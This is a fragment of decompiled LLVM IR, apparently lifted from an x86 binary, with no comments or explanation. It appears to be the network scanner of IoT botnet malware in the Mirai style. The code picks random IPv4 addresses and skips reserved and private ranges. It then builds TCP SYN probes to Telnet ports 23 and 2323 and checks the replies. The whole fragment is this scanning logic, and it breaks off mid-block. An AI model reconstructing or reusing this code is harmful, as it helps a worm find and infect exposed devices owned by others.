  %.pre = trunc i32 %v2_8050231 to i8
  br label %dec_label_pc_805026e

dec_label_pc_8050057:                             ; preds = %dec_label_pc_8050265, %dec_label_pc_805004e
  %v11_8050057 = icmp eq i8 %v2_805023a, -87
  br i1 %v11_8050057, label %dec_label_pc_80502bd, label %dec_label_pc_8050060

dec_label_pc_8050060:                             ; preds = %dec_label_pc_80502b4, %dec_label_pc_8050057
  %v0_8050060 = phi i32 [ %v0_80502b4, %dec_label_pc_80502b4 ], [ %v5_805022f, %dec_label_pc_8050057 ]
  %v0_80500e869 = phi i32 [ %v0_80502ab, %dec_label_pc_80502b4 ], [ %v2_8050231, %dec_label_pc_8050057 ]
  %v1_8050060 = trunc i32 %v0_8050060 to i8
  %v11_8050060 = icmp eq i8 %v1_8050060, -58
  br i1 %v11_8050060, label %dec_label_pc_8050285, label %dec_label_pc_8050069

dec_label_pc_8050069:                             ; preds = %dec_label_pc_80502bd, %dec_label_pc_805027c, %dec_label_pc_8050060
  %v0_8050069 = phi i32 [ %v0_805006976, %dec_label_pc_80502bd ], [ %v5_805022f, %dec_label_pc_805027c ], [ %v0_8050060, %dec_label_pc_8050060 ]
  %v0_80500e868 = phi i32 [ %v0_80502bd, %dec_label_pc_80502bd ], [ %v2_8050231, %dec_label_pc_805027c ], [ %v0_80500e869, %dec_label_pc_8050060 ]
  %v1_8050069 = trunc i32 %v0_8050069 to i8
  %tmp283 = icmp ult i8 %v1_8050069, -32
  br i1 %tmp283, label %dec_label_pc_8050072, label %dec_label_pc_8050224.preheader

dec_label_pc_8050072:                             ; preds = %dec_label_pc_805026e, %dec_label_pc_80502a2.dec_label_pc_8050072_crit_edge, %dec_label_pc_805028e, %dec_label_pc_8050069, %dec_label_pc_8050285
  %v0_80500e8 = phi i32 [ %v0_80502ab, %dec_label_pc_80502a2.dec_label_pc_8050072_crit_edge ], [ %v0_805028e, %dec_label_pc_805028e ], [ %v0_80500e868, %dec_label_pc_8050069 ], [ %v0_805028e, %dec_label_pc_8050285 ], [ %v2_8050231, %dec_label_pc_805026e ]
  %v0_80500f6 = phi i32 [ %v0_8050072.pre, %dec_label_pc_80502a2.dec_label_pc_8050072_crit_edge ], [ %v0_805007265, %dec_label_pc_805028e ], [ %v0_8050069, %dec_label_pc_8050069 ], [ %v0_805007265, %dec_label_pc_8050285 ], [ %v5_805022f, %dec_label_pc_805026e ]
  %v1_8050072 = add i32 %v0_80500f6, -6
  store i32 %v1_8050072, i32* %eax.global-to-local, align 4
  %v1_8050075 = trunc i32 %v1_8050072 to i8
  %tmp284 = or i8 %v1_8050075, 1
  %tmp285 = icmp eq i8 %tmp284, 1
  br i1 %tmp285, label %dec_label_pc_8050224.preheader, label %dec_label_pc_805007d

dec_label_pc_805007d:                             ; preds = %dec_label_pc_8050072
  %v1_805007d = trunc i32 %v0_80500f6 to i8
  %v10_805007d = icmp eq i8 %v1_805007d, 11
  br i1 %v10_805007d, label %dec_label_pc_8050224.preheader, label %dec_label_pc_8050086

dec_label_pc_8050086:                             ; preds = %dec_label_pc_805007d
  %v10_8050086 = icmp eq i8 %v1_805007d, 21
  br i1 %v10_8050086, label %dec_label_pc_8050224.preheader, label %dec_label_pc_805008f

dec_label_pc_805008f:                             ; preds = %dec_label_pc_8050086
  %v10_805008f = icmp eq i8 %v1_805007d, 22
  br i1 %v10_805008f, label %dec_label_pc_8050224.preheader, label %dec_label_pc_8050098

dec_label_pc_8050098:                             ; preds = %dec_label_pc_805008f
  %v10_8050098 = icmp eq i8 %v1_805007d, 26
  br i1 %v10_8050098, label %dec_label_pc_8050224.preheader, label %dec_label_pc_80500a1

dec_label_pc_80500a1:                             ; preds = %dec_label_pc_8050098
  %v10_80500a1 = icmp eq i8 %v1_805007d, 28
  br i1 %v10_80500a1, label %dec_label_pc_8050224.preheader, label %dec_label_pc_80500aa

dec_label_pc_80500aa:                             ; preds = %dec_label_pc_80500a1
  %v10_80500aa = icmp eq i8 %v1_805007d, 29
  br i1 %v10_80500aa, label %dec_label_pc_8050224.preheader, label %dec_label_pc_80500b3

dec_label_pc_80500b3:                             ; preds = %dec_label_pc_80500aa
  %v10_80500b3 = icmp eq i8 %v1_805007d, 30
  br i1 %v10_80500b3, label %dec_label_pc_8050224.preheader, label %dec_label_pc_80500bc

dec_label_pc_80500bc:                             ; preds = %dec_label_pc_80500b3
  %v10_80500bc = icmp eq i8 %v1_805007d, 33
  br i1 %v10_80500bc, label %dec_label_pc_8050224.preheader, label %dec_label_pc_80500c5

dec_label_pc_80500c5:                             ; preds = %dec_label_pc_80500bc
  %v10_80500c5 = icmp eq i8 %v1_805007d, 55
  br i1 %v10_80500c5, label %dec_label_pc_8050224.preheader, label %dec_label_pc_80500ce

dec_label_pc_80500ce:                             ; preds = %dec_label_pc_80500c5
  %v11_80500ce = icmp eq i8 %v1_805007d, -42
  br i1 %v11_80500ce, label %dec_label_pc_8050224.preheader, label %dec_label_pc_80500d7

dec_label_pc_80500d7:                             ; preds = %dec_label_pc_80500ce
  %v11_80500d7 = icmp eq i8 %v1_805007d, -41
  br i1 %v11_80500d7, label %dec_label_pc_8050224.preheader, label %dec_label_pc_80500e0

dec_label_pc_80500e0:                             ; preds = %dec_label_pc_80500d7
  %v0_80500e2 = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_80568ca.35 to i16*), align 4
  %v1_80500e8 = mul i32 %v0_80500e8, 65536
  %v2_80500f3 = and i32 %v1_80500e8, 16711680
  %v2_80500f6 = mul i32 %v0_80500f6, 16777216
  %v1_80500e2 = mul i32 %v0_80500e2, 256
  %v2_80500fc = or i32 %v2_80500f3, %v2_80500f6
  %v0_80500fe = load i32, i32* @edi, align 4
  %v1_8050100 = urem i32 %v0_80500fe, 256
  store i32 %v1_8050100, i32* %eax.global-to-local, align 4
  %v2_8050105 = or i32 %v1_8050100, %v2_80500fc
  store i32 %v2_8050105, i32* %ecx.global-to-local, align 4
  %v2_8050107 = or i32 %v1_8050100, %v1_80500e2
  %v1_8050109 = load i32, i32* @esp, align 4
  %v2_8050109 = add i32 %v1_8050109, -4
  %v3_8050109 = inttoptr i32 %v2_8050109 to i32*
  store i32 %v2_8050105, i32* %v3_8050109, align 4
  %v1_805010a = trunc i32 %v2_8050107 to i16
  %v2_805010a = call i16 @llvm.bswap.i16(i16 %v1_805010a)
  %v3_805010a = zext i16 %v2_805010a to i32
  %v1_805010e = udiv i32 %v2_80500fc, 65536
  %v2_805010e = mul nuw i32 %v3_805010a, 65536
  %v1_8050111 = trunc i32 %v1_805010e to i16
  %v2_8050111 = call i16 @llvm.bswap.i16(i16 %v1_8050111)
  %v3_8050111 = zext i16 %v2_8050111 to i32
  %v6_8050111 = or i32 %v2_805010e, %v3_8050111
  store i32 %v6_8050111, i32* %edx.global-to-local, align 4
  %v0_8050115 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050115 = add i32 %v1_8050109, -8
  %v3_8050115 = inttoptr i32 %v2_8050115 to i32*
  store i32 %v0_8050115, i32* %v3_8050115, align 4
  %v0_8050116 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8050116, i32* @global_var_80568d0.36, align 16
  %v1_805011c = add i32 %v1_8050109, -12
  %v2_805011c = inttoptr i32 %v1_805011c to i32*
  store i32 20, i32* %v2_805011c, align 4
  %v1_805011e = add i32 %v1_8050109, -16
  %v2_805011e = inttoptr i32 %v1_805011e to i32*
  store i32 ptrtoint (i32* @global_var_80568c0.37 to i32), i32* %v2_805011e, align 4
  %v0_8050123 = call i32 @function_804d4b0()
  %v1_8050123 = trunc i32 %v0_8050123 to i16
  store i32 %v0_8050123, i32* %eax.global-to-local, align 4
  %v0_8050128 = load i32, i32* @esp, align 4
  %v1_8050128 = add i32 %v0_8050128, 1884
  %v2_8050128 = inttoptr i32 %v1_8050128 to i32*
  %v3_8050128 = load i32, i32* %v2_8050128, align 4
  store i16 %v1_8050123, i16* bitcast (i32* @global_var_80568ca.35 to i16*), align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_805013e = ashr i32 %v3_8050128, 31
  %v2_8050144 = zext i32 %v3_8050128 to i64
  %v4_8050144 = zext i32 %v2_805013e to i64
  %v5_8050144 = mul nuw i64 %v4_8050144, 4294967296
  %v6_8050144 = or i64 %v5_8050144, %v2_8050144
  %v10_8050144 = srem i64 %v6_8050144, 10
  %v11_8050144 = trunc i64 %v10_8050144 to i32
  store i32 %v11_8050144, i32* %edx.global-to-local, align 4
  %v1_8050146 = icmp eq i32 %v11_8050144, 0
  %v1_8050148 = icmp eq i1 %v1_8050146, false
  %. = select i1 %v1_8050148, i16 5888, i16 4873
  store i16 %., i16* @global_var_80568d6.38, align 2
  %v0_8050157 = load i32, i32* @global_var_80568d0.36, align 16
  store i32 %v0_8050157, i32* %eax.global-to-local, align 4
  %v1_805015c = add i32 %v0_8050128, 12
  %v2_805015c = inttoptr i32 %v1_805015c to i32*
  store i32 20, i32* %v2_805015c, align 4
  %v0_805015e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_805015e, i32* @global_var_80568d8.39, align 8
  %v1_8050163 = add i32 %v0_8050128, 8
  %v2_8050163 = inttoptr i32 %v1_8050163 to i32*
  store i32 5120, i32* %v2_8050163, align 4
  store i16 0, i16* bitcast (i32* @global_var_80568e4.40 to i16*), align 4
  %v1_8050171 = add i32 %v0_8050128, 4
  %v2_8050171 = inttoptr i32 %v1_8050171 to i32*
  store i32 ptrtoint (i32* @global_var_80568d4.41 to i32), i32* %v2_8050171, align 4
  %v2_8050176 = inttoptr i32 %v0_8050128 to i32*
  store i32 ptrtoint (i32* @global_var_80568c0.37 to i32), i32* %v2_8050176, align 4
  %v0_805017b = call i32 @function_804d500()
  %v1_805017b = trunc i32 %v0_805017b to i16
  store i16 %v1_805017b, i16* bitcast (i32* @global_var_80568e4.40 to i16*), align 4
  %v0_8050186 = load i32, i32* @global_var_80568d0.36, align 16
  store i32 %v0_8050186, i32* %eax.global-to-local, align 4
  %v1_805018b = load i32, i32* @esp, align 4
  %v2_805018b = add i32 %v1_805018b, 1848
  %v3_805018b = inttoptr i32 %v2_805018b to i32*
  store i32 %v0_8050186, i32* %v3_805018b, align 4
  %v0_8050192 = load i16, i16* @global_var_80568d6.38, align 2
  %v1_8050192 = zext i16 %v0_8050192 to i32
  %v2_8050192 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050192 = and i32 %v2_8050192, -65536
  %v4_8050192 = or i32 %v3_8050192, %v1_8050192
  store i32 %v4_8050192, i32* %eax.global-to-local, align 4
  %v0_8050198 = load i32, i32* @esp, align 4
  %v1_8050198 = add i32 %v0_8050198, 1844
  %v2_8050198 = inttoptr i32 %v1_8050198 to i16*
  store i16 2, i16* %v2_8050198, align 2
  %v0_80501a2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80501a2 = trunc i32 %v0_80501a2 to i16
  %v2_80501a2 = load i32, i32* @esp, align 4
  %v3_80501a2 = add i32 %v2_80501a2, 1846
  %v4_80501a2 = inttoptr i32 %v3_80501a2 to i16*
  store i16 %v1_80501a2, i16* %v4_80501a2, align 2
  %v0_80501aa = load i32, i32* @esp, align 4
  %v1_80501aa = inttoptr i32 %v0_80501aa to i32*
  %v3_80501aa = add i32 %v0_80501aa, 4
  %v0_80501ab = load i32, i32* @global_var_805693c.42, align 4
  store i32 %v0_80501ab, i32* %eax.global-to-local, align 4
  %v1_80501b0 = inttoptr i32 %v3_80501aa to i32*
  %v2_80501b0 = load i32, i32* %v1_80501b0, align 4
  store i32 %v2_80501b0, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_80501b0, align 4
  %v0_80501b3 = load i32, i32* @ebp, align 4
  store i32 %v0_80501b3, i32* %v1_80501aa, align 4
  %v1_80501b4 = add i32 %v0_80501aa, -4
  %v2_80501b4 = inttoptr i32 %v1_80501b4 to i32*
  store i32 16384, i32* %v2_80501b4, align 4
  %v1_80501b9 = add i32 %v0_80501aa, -8
  %v2_80501b9 = inttoptr i32 %v1_80501b9 to i32*
  store i32 40, i32* %v2_80501b9, align 4
  %v1_80501bb = add i32 %v0_80501aa, -12
  %v2_80501bb = inttoptr i32 %v1_80501bb to i32*
  store i32 ptrtoint (i32* @global_var_80568c0.37 to i32), i32* %v2_80501bb, align 4
  %v0_80501c0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80501c0 = add i32 %v0_80501aa, -16
  %v3_80501c0 = inttoptr i32 %v2_80501c0 to i32*
  store i32 %v0_80501c0, i32* %v3_80501c0, align 4
  %v0_80501c1 = call i32 @function_8052907()
  store i32 %v0_80501c1, i32* %eax.global-to-local, align 4
  %v0_80501c6 = load i32, i32* @esp, align 4
  %v1_80501c6 = add i32 %v0_80501c6, 1900
  %v2_80501c6 = inttoptr i32 %v1_80501c6 to i32*
  %v3_80501c6 = load i32, i32* %v2_80501c6, align 4
  %v1_80501cd = add i32 %v3_80501c6, 1
  store i32 %v1_80501cd, i32* %eax.global-to-local, align 4
  store i32 %v1_80501cd, i32* %v2_80501c6, align 4
  %v0_80501d5 = load i32, i32* @esp, align 4
  %v1_80501d5 = add i32 %v0_80501d5, 32
  %v0_80501d8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80501d8 = add i32 %v0_80501d8, -159
  %v6_80501d8 = sub i32 158, %v0_80501d8
  %v7_80501d8 = and i32 %v6_80501d8, %v0_80501d8
  %v8_80501d8 = icmp slt i32 %v7_80501d8, 0
  %v9_80501d8 = icmp eq i32 %v1_80501d8, 0
  %v10_80501d8 = icmp slt i32 %v1_80501d8, 0
  %v3_80501dd = icmp eq i1 %v10_80501d8, %v8_80501d8
  %v4_80501dd = icmp eq i1 %v9_80501d8, false
  %v5_80501dd = and i1 %v4_80501dd, %v3_80501dd
  br i1 %v5_80501dd, label %dec_label_pc_80502d9, label %dec_label_pc_80501e3

dec_label_pc_80501e3:                             ; preds = %dec_label_pc_80500e0, %dec_label_pc_805002e
  %v0_80501e3 = phi i32 [ %v1_80501d5, %dec_label_pc_80500e0 ], [ %v0_80501e3.pre, %dec_label_pc_805002e ]
  %v1_80501e3 = add i32 %v0_80501e3, 1828
  %v2_80501e3 = inttoptr i32 %v1_80501e3 to i32*
  store i32 0, i32* %v2_80501e3, align 4
  %v0_80501ee = load i32, i32* @esp, align 4
  %v1_80501ee = add i32 %v0_80501ee, 1832
  %v2_80501ee = inttoptr i32 %v1_80501ee to i32*
  store i32 0, i32* %v2_80501ee, align 4
  %v0_80501f9 = load i32, i32* @esp, align 4
  %v1_80501f9 = add i32 %v0_80501f9, 1836
  %v2_80501f9 = inttoptr i32 %v1_80501f9 to i32*
  store i32 0, i32* %v2_80501f9, align 4
  %v0_8050204 = load i32, i32* @esp, align 4
  %v1_8050204 = add i32 %v0_8050204, 1840
  %v2_8050204 = inttoptr i32 %v1_8050204 to i32*
  store i32 0, i32* %v2_8050204, align 4
  %v1_805020f = call i32 @function_804f020(i32 ptrtoint (i32* @0 to i32))
  %v2_805020f = trunc i32 %v1_805020f to i16
  store i16 %v2_805020f, i16* bitcast (i32* @global_var_80568c4.43 to i16*), align 4
  %v0_805021a = load i32, i32* @global_var_805691c.27, align 4
  store i32 %v0_805021a, i32* %eax.global-to-local, align 4
  store i32 %v0_805021a, i32* @global_var_80568cc.44, align 4
  br label %dec_label_pc_8050224.preheader

dec_label_pc_8050224.preheader:                   ; preds = %dec_label_pc_80501e3, %dec_label_pc_8050072, %dec_label_pc_805007d, %dec_label_pc_8050086, %dec_label_pc_805008f, %dec_label_pc_8050098, %dec_label_pc_80500a1, %dec_label_pc_80500aa, %dec_label_pc_80500b3, %dec_label_pc_80500bc, %dec_label_pc_80500c5, %dec_label_pc_80500ce, %dec_label_pc_80500d7, %dec_label_pc_805028e, %dec_label_pc_80502ab, %dec_label_pc_8050069, %dec_label_pc_80502bd
  br label %dec_label_pc_8050224

dec_label_pc_8050224:                             ; preds = %dec_label_pc_8050277, %dec_label_pc_8050260, %dec_label_pc_8050252, %dec_label_pc_805024d, %dec_label_pc_8050246, %dec_label_pc_8050242, %dec_label_pc_805023e, %dec_label_pc_8050224, %dec_label_pc_8050224.preheader
  %v1_8050224 = call i32 @function_804f020(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050224, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v1_8050224, 65536
  %v1_8050229 = sdiv i32 %sext, 65536
  %v2_805022f = urem i32 %v1_8050224, 256
  %v3_805022f = load i32, i32* @ecx, align 4
  %v4_805022f = and i32 %v3_805022f, -256
  %v5_805022f = or i32 %v4_805022f, %v2_805022f
  store i32 %v5_805022f, i32* @ecx, align 4
  %v2_8050231 = udiv i32 %v1_8050229, 256
  store i32 %v2_8050231, i32* @ebx, align 4
  %v2_8050234 = udiv i32 %v1_8050229, 65536
  store i32 %v2_8050234, i32* @edx, align 4
  %v2_8050237 = udiv i32 %v1_8050229, 16777216
  store i32 %v2_8050237, i32* @edi, align 4
  %v2_805023a = trunc i32 %v1_8050224 to i8
  %v11_805023a = icmp eq i8 %v2_805023a, 127
  br i1 %v11_805023a, label %dec_label_pc_8050224, label %dec_label_pc_805023e

dec_label_pc_805023e:                             ; preds = %dec_label_pc_8050224
  %v6_805023e = icmp eq i8 %v2_805023a, 0
  br i1 %v6_805023e, label %dec_label_pc_8050224, label %dec_label_pc_8050242

dec_label_pc_8050242:                             ; preds = %dec_label_pc_805023e
  %v11_8050242 = icmp eq i8 %v2_805023a, 3
  br i1 %v11_8050242, label %dec_label_pc_8050224, label %dec_label_pc_8050246

dec_label_pc_8050246:                             ; preds = %dec_label_pc_8050242
  %v2_8050246 = add nsw i32 %v1_8050229, -15
  store i32 %v2_8050246, i32* %eax.global-to-local, align 4
  %v1_8050249 = trunc i32 %v2_8050246 to i8
  %tmp286 = or i8 %v1_8050249, 1
  %tmp287 = icmp eq i8 %tmp286, 1
  br i1 %tmp287, label %dec_label_pc_8050224, label %dec_label_pc_805024d

dec_label_pc_805024d:                             ; preds = %dec_label_pc_8050246
  %v10_805024d = icmp eq i8 %v2_805023a, 56
  br i1 %v10_805024d, label %dec_label_pc_8050224, label %dec_label_pc_8050252

dec_label_pc_8050252:                             ; preds = %dec_label_pc_805024d
  %v10_8050252 = icmp eq i8 %v2_805023a, 10
  br i1 %v10_8050252, label %dec_label_pc_8050224, label %dec_label_pc_8050257

dec_label_pc_8050257:                             ; preds = %dec_label_pc_8050252
  %v8_8050257 = icmp eq i8 %v2_805023a, -64
  %v1_805025a = icmp eq i1 %v8_8050257, false
  br i1 %v1_805025a, label %dec_label_pc_8050045, label %dec_label_pc_8050260

dec_label_pc_8050260:                             ; preds = %dec_label_pc_8050257
  %v1_8050260 = trunc i32 %v2_8050231 to i8
  %v11_8050260 = icmp eq i8 %v1_8050260, -88
  br i1 %v11_8050260, label %dec_label_pc_8050224, label %dec_label_pc_8050265

dec_label_pc_8050265:                             ; preds = %dec_label_pc_8050260
  %v10_8050265 = icmp eq i8 %v2_805023a, 100
  %v1_8050268 = icmp eq i1 %v10_8050265, false
  br i1 %v1_8050268, label %dec_label_pc_8050057, label %dec_label_pc_805026e

dec_label_pc_805026e:                             ; preds = %dec_label_pc_805004e.dec_label_pc_805026e_crit_edge, %dec_label_pc_8050265
  %v1_805026e.pre-phi = phi i8 [ %.pre, %dec_label_pc_805004e.dec_label_pc_805026e_crit_edge ], [ %v1_8050260, %dec_label_pc_8050265 ]
  %tmp288 = icmp ult i8 %v1_805026e.pre-phi, 64
  br i1 %tmp288, label %dec_label_pc_8050072, label %dec_label_pc_8050277

dec_label_pc_8050277:                             ; preds = %dec_label_pc_805026e
  %tmp289 = icmp ult i8 %v1_805026e.pre-phi, 127
  br i1 %tmp289, label %dec_label_pc_8050224, label %dec_label_pc_805027c

dec_label_pc_805027c:                             ; preds = %dec_label_pc_8050277
  %v11_805027c = icmp eq i8 %v2_805023a, -58
  %v1_805027f = icmp eq i1 %v11_805027c, false
  br i1 %v1_805027f, label %dec_label_pc_8050069, label %dec_label_pc_8050285

dec_label_pc_8050285:                             ; preds = %dec_label_pc_805027c, %dec_label_pc_8050060
  %v0_805028e = phi i32 [ %v2_8050231, %dec_label_pc_805027c ], [ %v0_80500e869, %dec_label_pc_8050060 ]
  %v0_805007265 = phi i32 [ %v5_805022f, %dec_label_pc_805027c ], [ %v0_8050060, %dec_label_pc_8050060 ]
  %v1_8050285 = trunc i32 %v0_805028e to i8
  %tmp290 = icmp ult i8 %v1_8050285, 18
  br i1 %tmp290, label %dec_label_pc_8050072, label %dec_label_pc_805028e

dec_label_pc_805028e:                             ; preds = %dec_label_pc_8050285
  %tmp291 = or i8 %v1_8050285, 1
  %tmp292 = icmp eq i8 %tmp291, 19
  br i1 %tmp292, label %dec_label_pc_8050224.preheader, label %dec_label_pc_8050072

dec_label_pc_8050298:                             ; preds = %dec_label_pc_8051035
  store i32 0, i32* %v2_805029b, align 4
  %v1_805029d = call i32 @function_8053cd9(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_805029d, i32* %eax.global-to-local, align 4
  %v0_80502a2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80502a2

dec_label_pc_80502a2:                             ; preds = %dec_label_pc_8050045, %dec_label_pc_8050298
  %v0_80502ab = phi i32 [ %v0_80502a2.pre, %dec_label_pc_8050298 ], [ %v2_8050231, %dec_label_pc_8050045 ]
  %v1_80502a2 = trunc i32 %v0_80502ab to i8
  %tmp293 = icmp ult i8 %v1_80502a2, 16
  br i1 %tmp293, label %dec_label_pc_80502a2.dec_label_pc_8050072_crit_edge, label %dec_label_pc_80502ab

dec_label_pc_80502a2.dec_label_pc_8050072_crit_edge: ; preds = %dec_label_pc_80502a2
  %v0_8050072.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050072

dec_label_pc_80502ab:                             ; preds = %dec_label_pc_80502a2
  %tmp294 = icmp ult i8 %v1_80502a2, 32
  br i1 %tmp294, label %dec_label_pc_8050224.preheader, label %dec_label_pc_80502b4

dec_label_pc_80502b4:                             ; preds = %dec_label_pc_80502ab
  %v0_80502b4 = load i32, i32* @ecx, align 4
  %v1_80502b4 = trunc i32 %v0_80502b4 to i8
  %v11_80502b4 = icmp eq i8 %v1_80502b4, -87
  %v1_80502b7 = icmp eq i1 %v11_80502b4, false
  br i1 %v1_80502b7, label %dec_label_pc_8050060, label %dec_label_pc_80502bd

dec_label_pc_80502bd:                             ; preds = %dec_label_pc_80502b4, %dec_label_pc_8050057
  %v0_805006976 = phi i32 [ %v0_80502b4, %dec_label_pc_80502b4 ], [ %v5_805022f, %dec_label_pc_8050057 ]
  %v0_80502bd = phi i32 [ %v0_80502ab, %dec_label_pc_80502b4 ], [ %v2_8050231, %dec_label_pc_8050057 ]
  %v1_80502bd = trunc i32 %v0_80502bd to i8
  %v11_80502bd = icmp eq i8 %v1_80502bd, -1
  %v1_80502c0 = icmp eq i1 %v11_80502bd, false
  br i1 %v1_80502c0, label %dec_label_pc_8050069, label %dec_label_pc_8050224.preheader

dec_label_pc_80502d9:                             ; preds = %dec_label_pc_80500e0
  %v0_80502d9 = load i32, i32* @esi, align 4
  %v2_80502d9 = add i32 %v0_80501d5, 56
  %v3_80502d9 = inttoptr i32 %v2_80502d9 to i32*
  store i32 %v0_80502d9, i32* %v3_80502d9, align 4
  br label %dec_label_pc_80502dd

dec_label_pc_80502dd:                             ; preds = %dec_label_pc_8050542, %dec_label_pc_80502d9
  %v1_80502dd = call i32 @function_80526c9(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80502dd, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80502e4 = load i32, i32* @esp, align 4
  %v2_80502e4 = add i32 %v1_80502e4, 40
  %v3_80502e4 = inttoptr i32 %v2_80502e4 to i32*
  store i32 %v1_80502dd, i32* %v3_80502e4, align 4
  br label %dec_label_pc_80502e8

dec_label_pc_80502e8:                             ; preds = %dec_label_pc_8050385, %dec_label_pc_805037d, %dec_label_pc_8050375, %dec_label_pc_805036d, %dec_label_pc_8050361, %dec_label_pc_8050355, %dec_label_pc_805034e, %dec_label_pc_805033c, %dec_label_pc_8050330, %dec_label_pc_805032b, %dec_label_pc_80503e4, %dec_label_pc_80502dd
  %v0_80502e8 = load i32, i32* @esp, align 4
  %v1_80502e8 = add i32 %v0_80502e8, 40
  %v2_80502e8 = inttoptr i32 %v1_80502e8 to i32*
  %v3_80502e8 = load i32, i32* %v2_80502e8, align 4
  store i32 %v3_80502e8, i32* %eax.global-to-local, align 4
  %v1_80502ec = inttoptr i32 %v3_80502e8 to i32*
  store i32 0, i32* %v1_80502ec, align 4
  %v0_80502f2 = load i32, i32* @edi, align 4
  %v1_80502f2 = load i32, i32* @esp, align 4
  %v2_80502f2 = add i32 %v1_80502f2, -4
  %v3_80502f2 = inttoptr i32 %v2_80502f2 to i32*
  store i32 %v0_80502f2, i32* %v3_80502f2, align 4
  %v0_80502f3 = load i32, i32* @edi, align 4
  %v2_80502f3 = add i32 %v1_80502f2, -8
  %v3_80502f3 = inttoptr i32 %v2_80502f3 to i32*
  store i32 %v0_80502f3, i32* %v3_80502f3, align 4
  %v1_80502f4 = add i32 %v1_80502f2, -12
  %v2_80502f4 = inttoptr i32 %v1_80502f4 to i32*
  store i32 0, i32* %v2_80502f4, align 4
  %v1_80502f6 = add i32 %v1_80502f2, -16
  %v2_80502f6 = inttoptr i32 %v1_80502f6 to i32*
  store i32 0, i32* %v2_80502f6, align 4
  %v1_80502f8 = add i32 %v1_80502f2, -20
  %v2_80502f8 = inttoptr i32 %v1_80502f8 to i32*
  store i32 16384, i32* %v2_80502f8, align 4
  %v1_80502fd = add i32 %v1_80502f2, -24
  %v2_80502fd = inttoptr i32 %v1_80502fd to i32*
  store i32 1514, i32* %v2_80502fd, align 4
  %v0_8050302 = load i32, i32* @global_var_805693c.42, align 4
  store i32 %v0_8050302, i32* %esi.global-to-local, align 4
  %v1_8050308 = add i32 %v1_80502f2, 58
  store i32 %v1_8050308, i32* %edx.global-to-local, align 4
  %v2_805030c = add i32 %v1_80502f2, -28
  %v3_805030c = inttoptr i32 %v2_805030c to i32*
  store i32 %v1_8050308, i32* %v3_805030c, align 4
  %v0_805030d = load i32, i32* %esi.global-to-local, align 4
  %v2_805030d = add i32 %v1_80502f2, -32
  %v3_805030d = inttoptr i32 %v2_805030d to i32*
  store i32 %v0_805030d, i32* %v3_805030d, align 4
  %v0_805030e = call i32 @function_8052891()
  store i32 %v0_805030e, i32* %eax.global-to-local, align 4
  %v0_8050313 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_805030e, 1
  br i1 %tmp, label %dec_label_pc_80503f5, label %dec_label_pc_805031e

dec_label_pc_805031e:                             ; preds = %dec_label_pc_80502e8
  %v1_805031e = add i32 %v0_8050313, 72
  %v2_805031e = inttoptr i32 %v1_805031e to i32*
  %v3_805031e = load i32, i32* %v2_805031e, align 4
  store i32 %v3_805031e, i32* %ecx.global-to-local, align 4
  %v1_8050322 = inttoptr i32 %v3_805031e to i32*
  %v2_8050322 = load i32, i32* %v1_8050322, align 4
  %v11_8050322 = icmp eq i32 %v2_8050322, 11
  br i1 %v11_8050322, label %dec_label_pc_80503f5, label %dec_label_pc_805032b

dec_label_pc_805032b:                             ; preds = %dec_label_pc_805031e
  %tmp295 = icmp ult i32 %v0_805030e, 40
  br i1 %tmp295, label %dec_label_pc_80502e8, label %dec_label_pc_8050330

dec_label_pc_8050330:                             ; preds = %dec_label_pc_805032b
  %v1_8050330 = add i32 %v0_8050313, 106
  %v2_8050330 = inttoptr i32 %v1_8050330 to i32*
  %v3_8050330 = load i32, i32* %v2_8050330, align 4
  store i32 %v3_8050330, i32* %eax.global-to-local, align 4
  %v1_8050334 = load i32, i32* @global_var_805691c.27, align 4
  %v12_8050334 = icmp eq i32 %v3_8050330, %v1_8050334
  %v1_805033a = icmp eq i1 %v12_8050334, false
  br i1 %v1_805033a, label %dec_label_pc_80502e8, label %dec_label_pc_805033c

dec_label_pc_805033c:                             ; preds = %dec_label_pc_8050330
  %v1_805033c = add i32 %v0_8050313, 99
  %v2_805033c = inttoptr i32 %v1_805033c to i8*
  %v3_805033c = load i8, i8* %v2_805033c, align 1
  %v12_805033c = icmp eq i8 %v3_805033c, 6
  %v1_8050341 = icmp eq i1 %v12_805033c, false
  br i1 %v1_8050341, label %dec_label_pc_80502e8, label %dec_label_pc_8050343

dec_label_pc_8050343:                             ; preds = %dec_label_pc_805033c
  %v1_8050343 = add i32 %v0_8050313, 110
  %v2_8050343 = inttoptr i32 %v1_8050343 to i32*
  %v3_8050343 = load i32, i32* %v2_8050343, align 4
  store i32 %v3_8050343, i32* %esi.global-to-local, align 4
  %v1_8050347 = trunc i32 %v3_8050343 to i16
  %v7_8050347 = icmp eq i16 %v1_8050347, 5888
  br i1 %v7_8050347, label %dec_label_pc_8050355, label %dec_label_pc_805034e

dec_label_pc_805034e:                             ; preds = %dec_label_pc_8050343
  %v10_805034e = icmp eq i16 %v1_8050347, 4873
  %v1_8050353 = icmp eq i1 %v10_805034e, false
  br i1 %v1_8050353, label %dec_label_pc_80502e8, label %dec_label_pc_8050355

dec_label_pc_8050355:                             ; preds = %dec_label_pc_805034e, %dec_label_pc_8050343
  %v1_8050355 = add i32 %v0_8050313, 54
  %v2_8050355 = inttoptr i32 %v1_8050355 to i16*
  %v3_8050355 = load i16, i16* %v2_8050355, align 2
  %v4_8050355 = zext i16 %v3_8050355 to i32
  %v6_8050355 = and i32 %v3_8050330, -65536
  %v7_8050355 = or i32 %v4_8050355, %v6_8050355
  store i32 %v7_8050355, i32* %eax.global-to-local, align 4
  %v3_805035a = add i32 %v0_8050313, 112
  %v4_805035a = inttoptr i32 %v3_805035a to i16*
